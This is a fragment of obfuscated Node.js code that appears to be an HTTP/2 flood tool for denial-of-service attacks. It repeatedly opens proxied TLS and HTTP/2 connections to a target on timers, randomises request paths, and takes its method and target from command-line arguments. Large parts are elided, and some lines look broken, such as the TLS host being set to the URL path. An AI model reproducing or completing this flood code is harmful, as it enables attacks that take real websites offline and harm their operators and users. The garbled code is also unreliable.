...
function ra() {
  const _0xa2cex19 = randstr.generate({
  ...
  if (process.argv[5].toUpperCase() == "POST") {
    ...
    if (randomparam) {
      setInterval(() => {
        ...
        var _0xa2cex21 = require("http");
        var _0xa2cex22 = require("tls");
        _0xa2cex22.DEFAULT_MAX_VERSION = "TLSv1.3";
        var _0xa2cex23 = _0xa2cex21.request({
          host: _0xa2cex20[0],
          port: _0xa2cex20[1],
          ciphers: _0xa2cex1f,
          method: "CONNECT",
        ...
        _0xa2cex23.on("connect", function (_0xa2cex25, _0xa2cex26, _0xa2cex15) {
          const _0xa2cex27 = http2.connect(parsed.href, {
            createConnection: () => {
      ...
      setInterval(() => {
        ...
        _0xa2cex23.on("connect", function (_0xa2cex25, _0xa2cex26, _0xa2cex15) {
          const _0xa2cex27 = http2.connect(parsed.href, {
            createConnection: () => {
              return _0xa2cex22.connect({
                host: `${""}${url.parse(target).path.includes("%RAND%") ? _0xa2cex1e : url.parse(target).path}${""}`,
                ciphers: _0xa2cex1f,
                secureProtocol: "TLS_method",
                servername: parsed.host,
                challengesToSolve: 5,
